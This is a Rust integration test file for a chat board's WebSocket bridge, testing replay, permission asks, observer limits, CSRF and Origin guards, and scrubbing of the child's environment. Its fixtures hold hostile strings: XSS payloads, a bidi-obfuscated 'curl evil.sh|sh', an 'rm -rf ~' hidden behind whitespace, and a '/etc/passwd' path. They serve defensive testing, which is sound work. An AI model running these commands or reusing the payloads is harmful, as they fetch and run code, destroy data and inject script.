//! The board's chats over a real socket: a child per chat — here this test binary re-run as a
//! stand-in `mnemorphd` (`fake_child`) — bridged to tabs on `WS /ws/session/<sid>`. A killed
//! socket replays every event once, a waiting ask survives a reload and is denied past the grace,
//! an observer acts on nothing, the upgrade is guarded, the child's environment is scrubbed and
//! its group dies with the chat and the board, and the child's text passes untouched within the
//! caps.

use std::collections::BTreeSet;
use std::ffi::OsString;
use std::io::{BufRead as _, Write as _};
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use axum::body::Body;
use axum::http::{Request, StatusCode, header};
use futures_util::{SinkExt as _, StreamExt as _};
use http_body_util::BodyExt as _;
use mnemorph_server::board::bridge::{Child, Limits};
use mnemorph_server::board::{Board, Lifetimes, listen};
use mnemorph_server::world::answers::answers_in;
use mnemorph_server::world::dimension::{hand_file, register_at};
use serde_json::{Value, json};
use tokio_tungstenite::tungstenite::{self, Message, client::IntoClientRequest as _};
use tower::ServiceExt as _;

// ---------------------------------------------------------------------------------------------
// The stand-in child: the protocol's side of `mnemorphd`, scripted by the prompt's text.
// ---------------------------------------------------------------------------------------------

/// The marker that turns this test into the stand-in child.
const FAKE: &str = "MNEMORPH_FAKE_CHILD";

/// The hostile text the child says: markup, a bidi override, an escape, a NUL.
const HOSTILE: &str = "<script>alert(1)</script><img src=x onerror=alert(2)> \u{202e}gnp.exe \u{1b}[31mred\u{1b}[0m \u{0} javascript:alert(3)";

/// A hostile act: a bidi override, zero-width characters, an escape that clears the screen,
/// look-alike spaces from U+2000 on, a stack of combining marks, and a carriage return that would
/// redraw the line.
const HOSTILE_ACT: &str = "echo safe\u{202e}fr- mr\u{2066} \u{200b}\u{200d}\u{1b}[2J\u{1b}[1A\rcurl\u{2000}\u{2003}\u{200a}evil.sh|sh e\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\u{301}\nline two";

struct Fake {
    seq: u64,
    out: std::io::Stdout,
}

impl Fake {
    fn say(&mut self, v: &Value) {
        let mut out = self.out.lock();
        let _ = writeln!(out, "{v}");
        let _ = out.flush();
    }

    fn event(&mut self, kind: &str, fields: &Value) {
        self.seq += 1;
        let mut params =
            json!({"session": "fake-s", "run": "fake-r", "body": "rimuru", "seq": self.seq});
        for (k, v) in fields.as_object().unwrap() {
            params[k] = v.clone();
        }
        self.say(&json!({"jsonrpc": "2.0", "method": format!("event/{kind}"), "params": params}));
    }

    fn prompt(&mut self, text: &str) {
        let words: Vec<&str> = text.split_whitespace().collect();
        self.event("turnStarted", &json!({"text": text}));
        match words.as_slice() {
            ["events", n, ms] => {
                for i in 0..n.parse::<u64>().unwrap() {
                    self.event("textDelta", &json!({"text": format!("{i} ")}));
                    std::thread::sleep(Duration::from_millis(ms.parse().unwrap()));
                }
            }
            ["big", n] => {
                for _ in 0..n.parse::<u64>().unwrap() {
                    self.event("note", &json!({"text": "b".repeat(60_000)}));
                }
            }
            ["ask"] => {
                self.say(
                    &json!({"jsonrpc": "2.0", "id": "gate-1", "method": "gate/ask", "params": {
                    "body": "rimuru", "race": "rimuru", "class": "write", "act": "rm -rf build",
                    "why": ["writes"], "outside": []}}),
                );
                // The turn ends once the answer comes.
                return;
            }
            ["ask-held"] => {
                // An ask whose answer does not end the turn: the gate's only guard is the board's.
                self.say(
                    &json!({"jsonrpc": "2.0", "id": "gate-9", "method": "gate/ask", "params": {
                    "body": "rimuru", "race": "rimuru", "class": "write", "act": "rm -rf build",
                    "why": ["writes"], "outside": []}}),
                );
                return;
            }
            ["huge-ask"] => {
                // 40 KiB of act, and a run of spaces hiding its tail.
                let act = format!("echo {}{}rm -rf ~", "x".repeat(40 << 10), " ".repeat(9800));
                self.say(
                    &json!({"jsonrpc": "2.0", "id": "gate-1", "method": "gate/ask", "params": {
                    "body": "rimuru", "race": "rimuru", "class": "destructive", "act": act,
                    "why": ["deletes"], "outside": []}}),
                );
                return;
            }
            ["hostile-ask"] => {
                self.say(
                    &json!({"jsonrpc": "2.0", "id": "gate-1", "method": "gate/ask", "params": {
                    "body": "orc-\u{202e}x", "race": "orc", "class": "outward",
                    "act": HOSTILE_ACT, "why": ["sends \u{200b}out"],
                    "outside": ["/etc/\u{2000}passwd"], "plan": "plan \u{1b}[2Jab"}}),
                );
                return;
            }
            ["env"] => {
                let env: std::collections::BTreeMap<String, String> = std::env::vars().collect();
                self.event(
                    "note",
                    &json!({"text": serde_json::to_string(&env).unwrap()}),
                );
            }
            ["spawn"] => {
                let sleeper = std::process::Command::new("sleep")
                    .arg("300")
                    .spawn()
                    .unwrap();
                self.event(
                    "note",
                    &json!({"text": format!("{} {}", std::process::id(), sleeper.id())}),
                );
                std::mem::forget(sleeper);
            }
            ["crash"] => {
                eprintln!("panicked: \u{1b}[31mthe model's reply did not parse\u{1b}[0m");
                std::process::exit(3);
            }
            ["hostile"] => {
                self.event("note", &json!({"text": HOSTILE}));
                self.event("note", &json!({"text": "x".repeat(200_000)}));
                self.event("note", &json!({"text": "after"}));
            }
            _ => {}
        }
        self.event("turnEnded", &json!({"ending": "answered"}));
    }
}

/// The stand-in child, when this binary is run as one; a no-op test otherwise.
#[test]
fn fake_child() {
    if std::env::var_os(FAKE).is_none() {
        return;
    }
    let mut fake = Fake {
        seq: 0,
        out: std::io::stdout(),
    };
    // libtest's own `test fake_child ... ` has no newline: end it, so the bridge drops it whole.
    fake.say(&json!(null));
    for line in std::io::stdin().lock().lines() {
        let Ok(line) = line else { break };
        let msg: Value = serde_json::from_str(&line).unwrap();
        let id = msg["id"].clone();
        match msg["method"].as_str() {
            Some("initialize") => fake.say(&json!({"jsonrpc": "2.0", "id": id, "result": {
                "protocol": 1, "version": "fake", "world": std::env::current_dir().unwrap(),
                "model": "m", "provider": "p", "session": "fake-s", "run": "fake-r",
                "holes": [], "budget": null, "key": null, "sandbox": "none", "body": "rimuru",
                "held": 0}})),
            Some("session/prompt") => {
                fake.say(&json!({"jsonrpc": "2.0", "id": id, "result": {"queued": false}}));
                fake.prompt(msg["params"]["text"].as_str().unwrap_or_default());
            }
            Some("shutdown") => {
                fake.say(&json!({"jsonrpc": "2.0", "id": id, "result": {}}));
                break;
            }
            Some(_) => fake.say(&json!({"jsonrpc": "2.0", "id": id, "result": {}})),
            None => {
                let r = &msg["result"];
                fake.event(
                    "note",
                    &json!({"text": format!("answer {} allow={} reason={}", id, r["allow"], r["reason"])}),
                );
                if id != "gate-9" {
                    fake.event("turnEnded", &json!({"ending": "answered"}));
                }
            }
        }
    }
    std::process::exit(0);
}

// ---------------------------------------------------------------------------------------------
// The rig: a board on a real loopback socket, a world, a browser's cookie and token.
// ---------------------------------------------------------------------------------------------

struct Rig {
    root: PathBuf,
    board: Arc<Board>,
    addr: SocketAddr,
    world: String,
}

impl Drop for Rig {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

/// A browser: its cookie and CSRF token.
#[derive(Clone)]
struct Browser {
    cookie: String,
    csrf: String,
}

fn rig(name: &str, limits: Limits) -> Rig {
    let root = std::env::temp_dir().join(format!("mnemorph-bridge-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(root.join("world/.mnemorph")).unwrap();
    let root = root.canonicalize().unwrap();
    let world = root.join("world");
    let registry = root.join("state/mnemorph/worlds.jsonl");
    register_at(&registry, &world, None).unwrap();
    // The human's global file names the provider key: the only secret the child gets.
    let global = root.join("global.toml");
    std::fs::write(
        &global,
        "[providers.fake]\nkind = \"openai\"\nbase_url = \"http://127.0.0.1:9\"\nkey_env = \"FAKE_PROVIDER_KEY\"\n",
    )
    .unwrap();
    let env = [
        ("PATH", std::env::var("PATH").unwrap_or_default()),
        (FAKE, "1".to_owned()),
        ("FAKE_PROVIDER_KEY", "sk-fake-provider".to_owned()),
        ("OTHER_API_TOKEN", "hunter2".to_owned()),
        ("DEPLOY_URL", "https://deploy:pw@example.com/x".to_owned()),
        ("AWS_PROFILE", "prod".to_owned()),
        ("SSH_AUTH_SOCK", "/tmp/ssh-x/agent".to_owned()),
        ("LANG", "C".to_owned()),
        // The child's home and state are the rig's, never the human's running the tests.
        ("HOME", root.display().to_string()),
        ("XDG_STATE_HOME", root.join("state").display().to_string()),
        ("XDG_CONFIG_HOME", root.join("config").display().to_string()),
        ("XDG_DATA_HOME", root.join("data").display().to_string()),
        ("XDG_CACHE_HOME", root.join("cache").display().to_string()),
        ("XDG_RUNTIME_DIR", root.join("run").display().to_string()),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_owned(), v))
    .collect();
    let child = Child {
        program: std::env::current_exe().unwrap(),
        args: Arc::new(|_, _| {
            [
                "--exact",
                "fake_child",
                "--nocapture",
                "--test-threads",
                "1",
            ]
            .map(OsString::from)
            .to_vec()
        }),
        env,
        global,
        answers: {
            let state = root.join("state");
            // A rig named `nohome-…` has no home to journal in.
            let home = !name.starts_with("nohome");
            Arc::new(move |w| home.then(|| answers_in(&state, w)))
        },
    };
    let listeners = listen(0, Some("127.0.0.1".parse().unwrap())).unwrap();
    let addr = listeners[0].local_addr().unwrap();
    let board = Board::bridged(
        &[addr],
        (registry.clone(), hand_file(&registry)),
        Box::new(|_| {}),
        Lifetimes::default(),
        child,
        limits,
    )
    .unwrap();
    // The board's clock moves only when a test moves it: a floor or a lifetime is an exact
    // instant, never the scheduler's jitter.
    board.stop_clock();
    let l = listeners.into_iter().next().unwrap();
    l.set_nonblocking(true).unwrap();
    let l = tokio::net::TcpListener::from_std(l).unwrap();
    tokio::spawn(axum::serve(l, board.router()).into_future());
    Rig {
        world: mnemorph_server::world::dimension::world_id(&world),
        root,
        board,
        addr,
    }
}

impl Rig {
    fn origin(&self) -> String {
        format!("http://{}", self.addr)
    }

    async fn call(&self, req: Request<Body>) -> (StatusCode, Value) {
        let res = self.board.router().oneshot(req).await.unwrap();
        let status = res.status();
        let bytes = res.into_body().collect().await.unwrap().to_bytes();
        (
            status,
            serde_json::from_slice(&bytes)
                .unwrap_or_else(|_| json!(String::from_utf8_lossy(&bytes))),
        )
    }

    /// Trade the waiting key: a browser.
    async fn login(&self) -> Browser {
        let key = self.board.url().split_once("#k=").unwrap().1.to_owned();
        let req = Request::post("/session")
            .header(header::HOST, self.addr.to_string())
            .header(header::ORIGIN, self.origin())
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(json!({ "key": key }).to_string()))
            .unwrap();
        let res = self.board.router().oneshot(req).await.unwrap();
        let cookie = res.headers()[header::SET_COOKIE].to_str().unwrap();
        let cookie = cookie.split(';').next().unwrap().to_owned();
        let bytes = res.into_body().collect().await.unwrap().to_bytes();
        let csrf = serde_json::from_slice::<Value>(&bytes).unwrap()["csrf"]
            .as_str()
            .unwrap()
            .to_owned();
        Browser { cookie, csrf }
    }

    /// Start a chat for `b`: its id.
    async fn start(&self, b: &Browser) -> String {
        let (status, body) = self.post_start(b).await;
        assert_eq!(status, StatusCode::CREATED, "{body}");
        assert_eq!(body["hello"]["session"], "fake-s");
        body["session"]["id"].as_str().unwrap().to_owned()
    }

    async fn post_start(&self, b: &Browser) -> (StatusCode, Value) {
        self.post_body(b, "{}").await
    }

    async fn post_body(&self, b: &Browser, body: &'static str) -> (StatusCode, Value) {
        self.call(
            Request::post(format!("/api/w/{}/sessions", self.world))
                .header(header::HOST, self.addr.to_string())
                .header(header::ORIGIN, self.origin())
                .header(header::COOKIE, &b.cookie)
                .header("x-mnemorph-csrf", &b.csrf)
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(body))
                .unwrap(),
        )
        .await
    }

    async fn live(&self, b: &Browser) -> Vec<Value> {
        let (status, body) = self
            .call(
                Request::get("/api/sessions")
                    .header(header::HOST, self.addr.to_string())
                    .header(header::COOKIE, &b.cookie)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await;
        assert_eq!(status, StatusCode::OK);
        body["sessions"].as_array().unwrap().clone()
    }

    /// A tab of `b` on chat `sid`, its upgrade carrying `origin` and `protocols`.
    async fn connect(
        &self,
        b: &Browser,
        sid: &str,
        origin: &str,
        protocols: &str,
    ) -> Result<Tab, tungstenite::Error> {
        let mut req = format!("ws://{}/ws/session/{sid}", self.addr)
            .into_client_request()
            .unwrap();
        let h = req.headers_mut();
        h.insert(header::ORIGIN, origin.parse().unwrap());
        h.insert(header::COOKIE, b.cookie.parse().unwrap());
        if !protocols.is_empty() {
            h.insert(header::SEC_WEBSOCKET_PROTOCOL, protocols.parse().unwrap());
        }
        let (ws, _) = tokio_tungstenite::connect_async(req).await?;
        Ok(Tab { ws, closed: None })
    }

    async fn tab(&self, b: &Browser, sid: &str) -> Tab {
        self.connect(
            b,
            sid,
            &self.origin(),
            &format!("mnemorph.v1, mnemorph.csrf.{}", b.csrf),
        )
        .await
        .unwrap()
    }
}

type Socket =
    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;

struct Tab {
    ws: Socket,
    /// The close frame's code, once closed.
    closed: Option<u16>,
}

impl Tab {
    async fn send(&mut self, v: &Value) {
        self.ws.send(Message::text(v.to_string())).await.unwrap();
    }

    async fn request(&mut self, id: u64, method: &str, params: &Value) {
        self.send(&json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}))
            .await;
    }

    /// The next message as text; `None` once closed.
    async fn text(&mut self) -> Option<String> {
        // One deadline for the message, pings and all: the board pings every 5 s.
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        loop {
            let next = tokio::time::timeout_at(deadline, self.ws.next())
                .await
                .expect("a message within 20 s");
            match next {
                Some(Ok(Message::Text(t))) => return Some(t.as_str().to_owned()),
                Some(Ok(Message::Close(frame))) => {
                    self.closed = frame.map(|f| u16::from(f.code));
                    return None;
                }
                Some(Ok(_)) => {}
                Some(Err(_)) | None => return None,
            }
        }
    }

    async fn next(&mut self) -> Option<Value> {
        self.text().await.map(|t| serde_json::from_str(&t).unwrap())
    }

    /// Messages until one matches `done`, it included.
    async fn until(&mut self, mut done: impl FnMut(&Value) -> bool) -> Vec<Value> {
        let mut seen = Vec::new();
        while let Some(m) = self.next().await {
            let stop = done(&m);
            seen.push(m);
            if stop {
                return seen;
            }
        }
        panic!(
            "closed ({:?}) before the awaited message: {seen:?}",
            self.closed
        );
    }

    /// Acknowledge rendering `ask`'s card, naming `digest`: the answer.
    async fn ack(&mut self, id: u64, ask: &Value, digest: &Value) -> Value {
        self.request(
            id,
            "board/seen",
            &json!({"id": ask["id"], "digest": digest}),
        )
        .await;
        self.until(|m| m["id"] == id).await.pop().unwrap()
    }

    /// Acknowledge `ask`'s card with its own digest: it must be taken.
    async fn seen(&mut self, id: u64, ask: &Value) {
        let r = self.ack(id, ask, &ask["params"]["digest"]).await;
        assert_eq!(r["result"], json!({}), "{r}");
    }

    /// Answer `ask`, naming `digest`.
    async fn answer(&mut self, ask: &Value, allow: bool, digest: &Value) {
        self.send(&json!({"jsonrpc": "2.0", "id": ask["id"], "result": {"allow": allow, "digest": digest}}))
            .await;
    }

    /// The next refusal's reason.
    async fn refused(&mut self) -> String {
        let r = self
            .until(|m| method(m) == "board/refused")
            .await
            .pop()
            .unwrap();
        r["params"]["why"].as_str().unwrap().to_owned()
    }

    /// The role it is told next.
    async fn role(&mut self) -> String {
        let m = self.until(|m| m["method"] == "board/role").await;
        m.last().unwrap()["params"]["role"]
            .as_str()
            .unwrap()
            .to_owned()
    }
}

fn method(m: &Value) -> &str {
    m["method"].as_str().unwrap_or_default()
}

fn note(m: &Value) -> Option<&str> {
    (method(m) == "event/note")
        .then(|| m["params"]["text"].as_str())
        .flatten()
}

/// Whether process `pid` is gone (or a zombie, waiting to be reaped by whoever adopted it): asked
/// of `ps`, which reads it on Linux and macOS alike.
fn dead(pid: u32) -> bool {
    let out = std::process::Command::new("ps")
        .args(["-o", "stat=", "-p", &pid.to_string()])
        .output()
        .unwrap();
    let stat = String::from_utf8_lossy(&out.stdout);
    let stat = stat.trim();
    stat.is_empty() || stat.starts_with('Z')
}

async fn all_dead(pids: &[u32]) -> bool {
    for _ in 0..100 {
        if pids.iter().all(|&p| dead(p)) {
            return true;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    false
}

// ---------------------------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_socket_killed_mid_turn_delivers_every_event_once_after_reconnect() {
    // Small pages, so the replay takes several.
    let r = rig(
        "replay",
        Limits {
            page: 2048,
            ..Limits::default()
        },
    );
    let b = r.login().await;
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    assert_eq!(tab.role().await, "controller");
    tab.request(1, "session/prompt", &json!({"text": "events 300 2"}))
        .await;
    // The client's view: every event it delivered, by seq.
    let mut delivered: Vec<u64> = Vec::new();
    while delivered.len() < 40 {
        let m = tab.next().await.unwrap();
        if let Some(seq) = m["params"]["seq"].as_u64()
            && method(&m).starts_with("event/")
        {
            delivered.push(seq);
        }
    }
    // Killed: no close frame, the turn still running.
    drop(tab);
    tokio::time::sleep(Duration::from_millis(300)).await;

    let mut tab = r.tab(&b, &sid).await;
    assert_eq!(
        tab.role().await,
        "controller",
        "the reloaded tab controls again"
    );
    let mut last = *delivered.last().unwrap();
    let mut held: Vec<(u64, String)> = Vec::new();
    let mut pages = 0;
    let mut end = None;
    // Replay, page by page; live events wait until it is done, as the SDK holds them.
    loop {
        tab.request(100 + pages, "session/events", &json!({"since": last}))
            .await;
        let answer = loop {
            let m = tab.next().await.unwrap();
            if m["id"] == json!(100 + pages) {
                break m;
            }
            if method(&m).starts_with("event/") {
                held.push((m["params"]["seq"].as_u64().unwrap(), method(&m).to_owned()));
            }
        };
        pages += 1;
        let result = &answer["result"];
        assert_eq!(result["complete"], true);
        for e in result["events"].as_array().unwrap() {
            let seq = e["params"]["seq"].as_u64().unwrap();
            assert!(seq > last, "a page repeats nothing");
            if e["method"] == "event/turnEnded" {
                end = Some(seq);
            }
            delivered.push(seq);
            last = seq;
        }
        if result["more"] != true {
            break;
        }
    }
    assert!(pages > 1, "the replay came in pages");
    for (seq, m) in held {
        if seq > last {
            if m == "event/turnEnded" {
                end = Some(seq);
            }
            delivered.push(seq);
            last = seq;
        }
    }
    while end.is_none() {
        let m = tab.next().await.unwrap();
        if let Some(seq) = m["params"]["seq"].as_u64()
            && seq > last
        {
            if method(&m) == "event/turnEnded" {
                end = Some(seq);
            }
            delivered.push(seq);
            last = seq;
        }
    }
    let end = end.unwrap();
    assert_eq!(end, 302, "turnStarted, 300 deltas, turnEnded");
    assert_eq!(
        delivered,
        (1..=end).collect::<Vec<_>>(),
        "every event once, in order"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_waiting_ask_survives_a_reload_and_the_reloaded_tab_answers_it() {
    let r = rig("reload", Limits::default());
    let b = r.login().await;
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "ask"}))
        .await;
    let first = tab.until(|m| method(m) == "gate/ask").await.pop().unwrap();
    assert_eq!(first["id"], "gate-1");
    assert_eq!(first["params"]["act"], "rm -rf build");
    let left = first["params"]["leftMs"].as_u64().unwrap();
    assert_eq!(
        left, 600_000,
        "the clock is stopped: the whole wait is left"
    );
    drop(tab);
    tokio::time::sleep(Duration::from_millis(300)).await;

    r.board.pass(Duration::from_secs(30));
    let mut tab = r.tab(&b, &sid).await;
    let seen = tab.until(|m| method(m) == "gate/ask").await;
    assert!(seen.iter().any(|m| m["params"]["role"] == "controller"));
    let again = seen.last().unwrap();
    assert_eq!(again["id"], "gate-1");
    let left = again["params"]["leftMs"].as_u64().unwrap();
    assert_eq!(left, 570_000, "time left counts down by the 30 s passed");
    tab.seen(7, again).await;
    r.board.pass(Duration::from_millis(300));
    tab.answer(again, true, &again["params"]["digest"]).await;
    let seen = tab.until(|m| note(m).is_some()).await;
    assert!(seen.iter().any(|m| method(m) == "board/askGone"));
    assert_eq!(
        note(seen.last().unwrap()),
        Some("answer \"gate-1\" allow=true reason=null")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn with_no_controller_past_the_grace_the_ask_is_denied_and_the_chat_ends() {
    let r = rig("grace", Limits::default());
    let owner = r.login().await;
    let other = r.login().await;
    let sid = r.start(&owner).await;
    let mut tab = r.tab(&owner, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "ask"}))
        .await;
    tab.until(|m| method(m) == "gate/ask").await;
    // Another browser watches; the owner's tab is gone.
    let mut watcher = r.tab(&other, &sid).await;
    assert_eq!(watcher.role().await, "observer");
    drop(tab);
    let told = watcher.until(|m| method(m) == "board/role").await;
    assert_eq!(told.last().unwrap()["params"]["controlled"], false);

    // Within the grace, nothing happens.
    r.board.pass(Duration::from_secs(50));
    tokio::time::sleep(Duration::from_millis(600)).await;
    assert_eq!(r.live(&owner).await.len(), 1);

    r.board.pass(Duration::from_secs(11));
    let seen = watcher.until(|m| method(m) == "board/ended").await;
    let denied = seen
        .iter()
        .find_map(note)
        .expect("the child heard the denial");
    assert!(
        denied.starts_with("answer \"gate-1\" allow=false"),
        "{denied}"
    );
    assert!(denied.contains("no tab held the chat for 60 s"), "{denied}");
    assert!(watcher.next().await.is_none());
    assert_eq!(watcher.closed, Some(4001));
    assert_eq!(r.live(&owner).await, Vec::<Value>::new());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn an_observer_cannot_answer_the_gate_nor_act() {
    let r = rig("observer", Limits::default());
    let owner = r.login().await;
    let other = r.login().await;
    let sid = r.start(&owner).await;
    let mut tab = r.tab(&owner, &sid).await;
    assert_eq!(tab.role().await, "controller");
    let mut stranger = r.tab(&other, &sid).await;
    assert_eq!(stranger.role().await, "observer");
    tab.request(1, "session/prompt", &json!({"text": "ask"}))
        .await;
    let ask = stranger
        .until(|m| method(m) == "gate/ask")
        .await
        .pop()
        .unwrap();
    assert_eq!(ask["id"], "gate-1");

    stranger
        .send(&json!({"jsonrpc": "2.0", "id": "gate-1", "result": {"allow": true}}))
        .await;
    let refused = stranger
        .until(|m| method(m) == "board/refused")
        .await
        .pop()
        .unwrap();
    assert!(
        refused["params"]["why"]
            .as_str()
            .unwrap()
            .contains("observes")
    );
    for (id, m) in [
        (2, "session/prompt"),
        (3, "session/interrupt"),
        (4, "shutdown"),
        (5, "board/takeOver"),
    ] {
        stranger.request(id, m, &json!({"text": "x"})).await;
        let err = stranger.until(|v| v["id"] == id).await.pop().unwrap();
        let code = err["error"]["code"].as_i64().unwrap();
        assert!(code == -32011 || code == -32010, "{m}: {err}");
    }

    // The owner's second tab observes until it takes over; then the first observes.
    let mut second = r.tab(&owner, &sid).await;
    assert_eq!(second.role().await, "observer");
    second.request(1, "board/takeOver", &json!({})).await;
    second.until(|m| m["params"]["role"] == "controller").await;
    // The ask is sent again to the tab that now controls.
    second.until(|m| method(m) == "gate/ask").await;
    tab.until(|m| m["params"]["role"] == "observer").await;
    second
        .send(&json!({"jsonrpc": "2.0", "id": "gate-1", "result": {"allow": false, "reason": "not now"}}))
        .await;
    let heard = second.until(|m| note(m).is_some()).await;
    assert_eq!(
        note(heard.last().unwrap()),
        Some("answer \"gate-1\" allow=false reason=\"not now\"")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn the_upgrade_is_guarded() {
    let r = rig("guard", Limits::default());
    let b = r.login().await;
    let sid = r.start(&b).await;
    let status = |e: tungstenite::Error| match e {
        tungstenite::Error::Http(res) => res.status().as_u16(),
        other => panic!("{other}"),
    };
    let good = format!("mnemorph.v1, mnemorph.csrf.{}", b.csrf);
    let e = r
        .connect(&b, &sid, "http://evil.example", &good)
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 403, "a foreign Origin");
    let e = r
        .connect(&b, &sid, "http://127.0.0.1:1", &good)
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 403, "another port's Origin");
    let e = r
        .connect(&b, &sid, &r.origin(), "mnemorph.v1")
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 403, "no CSRF token");
    let e = r
        .connect(&b, &sid, &r.origin(), "mnemorph.v1, mnemorph.csrf.00")
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 403, "a wrong CSRF token");
    let e = r
        .connect(
            &Browser {
                cookie: "mnemorph_board=00".into(),
                csrf: b.csrf.clone(),
            },
            &sid,
            &r.origin(),
            &good,
        )
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 401, "no session");
    let e = r
        .connect(&b, &sid, &r.origin(), &format!("mnemorph.csrf.{}", b.csrf))
        .await
        .err()
        .unwrap();
    assert_eq!(status(e), 400, "not the chat's subprotocol");
    // An unknown chat is closed with a code that says so.
    let mut tab = r.tab(&b, "nope").await;
    assert!(tab.next().await.is_none());
    assert_eq!(tab.closed, Some(4404));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn the_child_gets_a_scrubbed_env_and_dies_with_the_chat_and_the_board() {
    let r = rig("child", Limits::default());
    let b = r.login().await;
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "env"}))
        .await;
    let env = tab.until(|m| note(m).is_some()).await;
    let env: Value = serde_json::from_str(note(env.last().unwrap()).unwrap()).unwrap();
    let names: BTreeSet<&str> = env
        .as_object()
        .unwrap()
        .keys()
        .map(String::as_str)
        .collect();
    // The named provider key, and nothing secret beside it.
    assert_eq!(env["FAKE_PROVIDER_KEY"], "sk-fake-provider");
    assert!(names.contains("PATH") && names.contains("LANG") && names.contains(FAKE));
    assert!(!names.contains("OTHER_API_TOKEN"), "{names:?}");
    assert!(!names.contains("DEPLOY_URL"), "{names:?}");
    // Allowed by name only: what a body could use to reach the human's accounts stays out.
    assert!(
        !names.contains("AWS_PROFILE") && !names.contains("SSH_AUTH_SOCK"),
        "{names:?}"
    );
    assert!(names.contains("MNEMORPH_BOARD_PID"), "{names:?}");

    tab.request(2, "session/prompt", &json!({"text": "spawn"}))
        .await;
    let pids = tab.until(|m| note(m).is_some()).await;
    let pids: Vec<u32> = note(pids.last().unwrap())
        .unwrap()
        .split(' ')
        .map(|p| p.parse().unwrap())
        .collect();
    assert!(!pids.iter().any(|&p| dead(p)));
    tab.request(3, "shutdown", &json!({})).await;
    let seen = tab.until(|m| method(m) == "board/ended").await;
    assert!(seen.iter().any(|m| m["id"] == 3));
    assert!(
        all_dead(&pids).await,
        "the child and what it started: {pids:?}"
    );
    assert_eq!(r.live(&b).await, Vec::<Value>::new());

    // The board stops: every chat's group goes with it.
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "spawn"}))
        .await;
    let pids = tab.until(|m| note(m).is_some()).await;
    let pids: Vec<u32> = note(pids.last().unwrap())
        .unwrap()
        .split(' ')
        .map(|p| p.parse().unwrap())
        .collect();
    r.board.bridge().end_all("the board stopped").await;
    assert!(all_dead(&pids).await, "{pids:?}");
    let seen = tab.until(|m| method(m) == "board/ended").await;
    assert_eq!(seen.last().unwrap()["params"]["why"], "the board stopped");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn hostile_text_passes_untouched_within_the_caps() {
    let r = rig(
        "hostile",
        Limits {
            line: 64 << 10,
            ..Limits::default()
        },
    );
    let b = r.login().await;
    let sid = r.start(&b).await;
    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    tab.request(1, "session/prompt", &json!({"text": "hostile"}))
        .await;
    let mut raw = Vec::new();
    loop {
        let t = tab.text().await.unwrap();
        let done = t.contains("\"after\"");
        raw.push(t);
        if done {
            break;
        }
    }
    // Byte for byte as the child wrote it: rendering it inert is the page's job.
    let expected = json!({"jsonrpc": "2.0", "method": "event/note", "params": {
        "session": "fake-s", "run": "fake-r", "body": "rimuru", "seq": 2, "text": HOSTILE}})
    .to_string();
    assert!(raw.contains(&expected), "{raw:?}");
    // The line past the cap is dropped and said; the next one arrives.
    let over: Vec<Value> = raw
        .iter()
        .map(|t| serde_json::from_str(t).unwrap())
        .filter(|m: &Value| method(m) == "board/oversize")
        .collect();
    assert_eq!(over.len(), 1);
    assert!(over[0]["params"]["bytes"].as_u64().unwrap() > 200_000);
    assert!(raw.iter().all(|t| t.len() < 64 << 10));

    // A message past the inbound cap closes the tab, never reaches the child.
    tab.ws
        .send(Message::text(format!(
            r#"{{"jsonrpc":"2.0","id":9,"method":"session/prompt","params":{{"text":"{}"}}}}"#,
            "y".repeat(2 << 20)
        )))
        .await
        .ok();
    while tab.next().await.is_some() {}
    assert_eq!(r.live(&b).await.len(), 1, "the chat goes on");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_slow_tab_is_dropped_and_chats_are_capped() {
    let r = rig(
        "slow",
        Limits {
            sessions: 1,
            queue_bytes: 1 << 20,
            ..Limits::default()
        },
    );
    let b = r.login().await;
    let sid = r.start(&b).await;
    let (status, why) = r.post_start(&b).await;
    assert_eq!(status, StatusCode::TOO_MANY_REQUESTS, "{why}");

    let mut tab = r.tab(&b, &sid).await;
    tab.role().await;
    // 12 MB of events to a tab that reads nothing for a while.
    tab.request(1, "session/prompt", &json!({"text": "big 200"}))
        .await;
    tokio::time::sleep(Duration::from_secs(3)).await;
    while tab.text().await.is_some() {}
    assert_eq!(tab.closed, Some(4008), "dropped, not buffered");
    // It reconnects, and the chat is still there.
    let mut tab = r.tab(&b, &sid).await;
    assert_eq!(tab.role().await, "controller");
}

async fn tabs(r: &Rig, b: &Browser) -> u64 {
    r.live(b).await[0]["tabs"].as_u64().unwrap()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
